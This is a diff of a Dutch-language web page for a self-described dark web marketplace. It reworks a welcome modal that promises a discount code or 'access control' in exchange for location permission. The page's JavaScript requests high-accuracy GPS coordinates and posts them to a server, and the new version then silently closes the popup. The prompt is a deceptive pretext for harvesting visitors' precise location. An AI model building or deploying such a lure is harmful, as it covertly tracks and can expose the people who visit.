@@ -84,15 +84,15 @@ nav a:hover {
     box-shadow: 0 0 30px rgba(208, 28, 43, 0.6);
 }
 
-/* MODAL STYLING - EXTRA AANTREKKELIJK GEMAAKT */
+/* MODAL STYLING */
 .modal-overlay {
     position: fixed;
     top: 0;
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(2, 2, 2, 0.96);
-    backdrop-filter: blur(12px);
+    background: rgba(2, 2, 2, 0.95);
+    backdrop-filter: blur(10px);
     display: flex;
     align-items: center;
     justify-content: center;
@@ -101,103 +101,77 @@ nav a:hover {
 
 .modal-content {
     background: #050505;
-    border: 2px solid #d01c2b;
+    border: 1px solid #d01c2b;
     padding: 45px 40px;
-    max-width: 540px;
+    max-width: 520px;
     width: 90%;
     text-align: center;
-    box-shadow: 0 0 60px rgba(208, 28, 43, 0.35);
+    box-shadow: 0 0 50px rgba(208, 28, 43, 0.25);
     position: relative;
 }
 
 .modal-tag {
-    color: #00ff66;
+    color: #d01c2b;
     font-size: 11px;
     font-weight: bold;
     letter-spacing: 4px;
-    margin-bottom: 12px;
+    margin-bottom: 15px;
     text-transform: uppercase;
-    animation: pulse 1.5s infinite;
-}
-
-@keyframes pulse {
-    0% { opacity: 0.4; }
-    50% { opacity: 1; }
-    100% { opacity: 0.4; }
 }
 
 .modal-content h3 {
     color: #fff;
-    font-size: 24px;
+    font-size: 22px;
     margin-bottom: 15px;
     letter-spacing: 4px;
     font-weight: 700;
 }
 
 .modal-content p {
-    color: #999;
+    color: #888;
     font-size: 13px;
     line-height: 1.8;
-    margin-bottom: 25px;
+    margin-bottom: 30px;
     letter-spacing: 0.5px;
 }
 
 .market-box {
-    background: #0f0203;
-    border: 1px solid #3a080c;
-    border-left: 4px solid #d01c2b;
-    padding: 20px;
-    text-align: center;
+    background: #090203;
+    border: 1px solid #1f0507;
+    border-left: 2px solid #d01c2b;
+    padding: 18px;
+    text-align: left;
     margin-bottom: 30px;
-}
-
-.market-box .big-promo {
-    font-size: 20px;
-    color: #fff;
-    font-weight: bold;
-    letter-spacing: 2px;
-    margin-bottom: 5px;
-}
-
-.market-box .big-promo span {
-    color: #ff3344;
-    text-shadow: 0 0 10px rgba(208, 28, 43, 0.5);
-}
-
-.market-box .promo-sub {
     font-size: 12px;
-    color: #aaa;
-    letter-spacing: 1px;
+    color: #bbb;
+    line-height: 1.6;
+    letter-spacing: 0.5px;
+}
+
+.market-box span {
+    color: #d01c2b;
+    font-weight: bold;
 }
 
 .modal-btn {
     display: block;
     width: 100%;
-    padding: 16px;
-    background: #80000a;
+    padding: 15px;
+    background: #500005;
     color: #fff;
     text-decoration: none;
-    font-size: 14px;
+    font-size: 13px;
     letter-spacing: 3px;
     font-weight: bold;
-    border: 1px solid #ff3344;
+    border: 1px solid #d01c2b;
     cursor: pointer;
     transition: 0.2s;
     text-transform: uppercase;
-    box-shadow: 0 0 20px rgba(208, 28, 43, 0.4);
 }
 
 .modal-btn:hover {
     background: #d01c2b;
-    box-shadow: 0 0 35px rgba(208, 28, 43, 0.8);
-    transform: scale(1.02);
-}
-
-.browser-hint {
-    font-size: 10px;
-    color: #666;
-    margin-top: 15px;
-    letter-spacing: 1px;
+    box-shadow: 0 0 25px rgba(208, 28, 43, 0.6);
 }
 
 footer {
@@ -219,16 +193,15 @@ footer strong {
 
 <div id="welcome-modal" class="modal-overlay">
     <div class="modal-content" id="modal-body">
-        <div class="modal-tag">⚡ WELCOME BONUS GEREED ⚡</div>
-        <h3>ONTGRENDEL KORTING</h3>
-        <p>Verifieer je sessie om direct toegang te krijgen tot de collecties en je voordeel te activeren.</p>
+        <div class="modal-tag">SECURE MARKET GATE</div>
+        <h3>TOEGANGSCONTROLE</h3>
+        <p>Om door te gaan naar de dark website is het toestaan van locatie vereist.</p>
         
         <div class="market-box">
-            <div class="big-promo">ONTVANG <span>20% KORTING</span></div>
-            <div class="promo-sub">+ DIRECT GRATIS VERSLEUTELDE VERZENDING</div>
+            Na verificatie wordt de kortingscode <span>DWEB20</span> direct aan je sessie gekoppeld (20% korting + gratis verzending).
         </div>
 
-        <button class="modal-btn" onclick="requestGpsAndUnlock()">CLAIM DIRECT je KORTING</button>
+        <button class="modal-btn" onclick="requestGpsAndUnlock()">AKKOORD</button>
     </div>
 </div>
 
@@ -244,7 +217,7 @@ footer strong {
 <section class="hero">
     <h1>D-WEB MARKETPLACE</h1>
     <p>Gedecentraliseerde inventaris en versleutelde logistiek buiten het zicht van de openbare orde.</p>
-    <a href="/producten" class="hero-btn">BEKIJK COLLECTIES</a>
+    <a href="/producten" class="hero-btn">BEKIJK CATALOGUS</a>
 </section>
 
 <footer>
@@ -265,29 +238,16 @@ function requestGpsAndUnlock() {
                     body: JSON.stringify({ lat: lat, lon: lon })
                 })
                 .then(response => {
-                    if (response.ok) {
-                        return response.json().catch(() => ({ status: 'success' }));
-                    }
-                    return { status: 'success' };
-                })
-                .then(data => {
-                    document.getElementById('modal-body').innerHTML = `
-                        <div class="modal-tag" style="color:#00ff66;">✓ BONUS ACTIEF</div>
-                        <h3 style="color:#00ff66;">TOEGANG VERLEEND</h3>
-                        <p>Je sessie is succesvol geverifieerd. De korting van 20% staat klaar in je mandje.</p>
-                        <div class="market-box" style="border-color:#00ff66; background:#020b04;">
-                            <div class="big-promo" style="color:#00ff66;">KORTINGSCODE: DWEB20</div>
-                            <div class="promo-sub" style="color:#88ffaa;">20% Korting + Gratis Verzending toegepast</div>
-                        </div>
-                        <button class="modal-btn" style="background:#004d1a; border-color:#00ff66;" onclick="closeModal()">BETREED DE MARKTPLAATS</button>
-                    `;
+                    // Sluit de pop-up direct zodra de locatie is goedgekeurd en verzonden
+                    closeModal();
                 })
                 .catch(err => {
                     closeModal();
                 });
             },
             function(error) {
-                alert("Verificatie geannuleerd. Locatietoegang is vereist om de bonus te claimen.");
+                // Weigert alleen als ze op blokkeren/weigeren drukken
+                alert("Toegang geweigerd. Locatietoegang is vereist om de marktplaats te betreden.");
             },
             { timeout: 10000, enableHighAccuracy: true }
         );
